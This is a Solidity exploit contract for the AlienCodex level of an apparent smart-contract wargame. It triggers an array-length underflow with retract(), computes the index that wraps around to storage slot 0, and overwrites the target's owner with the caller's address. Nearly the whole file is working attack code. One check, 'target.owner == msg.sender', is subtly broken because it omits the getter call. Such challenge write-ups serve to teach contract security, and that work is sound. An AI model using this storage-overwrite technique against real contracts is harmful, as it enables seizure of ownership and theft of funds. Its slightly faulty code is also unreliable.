// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import '../../contracts/contracts/levels/AlienCodex.sol';

contract Exploit {

    AlienCodex public target;

    constructor(address _target) public {
        target = AlienCodex(_target);
    }

    function exploit() public {
        uint256 start = uint256(keccak256(abi.encodePacked(uint256(1))));  //slot for codex[0]; in AlienCodex, slot[0] 存放的的<bool + address>
        uint256 index = uint256(2)**uint256(256) - start;

        target.make_contact();
        target.retract();
        target.revise(index, bytes32(uint256(uint160(msg.sender))));
        require(target.owner == msg.sender);
    }

    function addressToByte32(address _addr) public pure returns(bytes32){
        return bytes32(uint256(uint160(_addr)));
    }

    function maxUint256() public pure returns(uint256){
        return uint256(2**256-1);
    }

    function startPosition(uint256 _slot) public pure returns(uint256){
        return uint256(keccak256(abi.encodePacked(_slot)));
    }
}
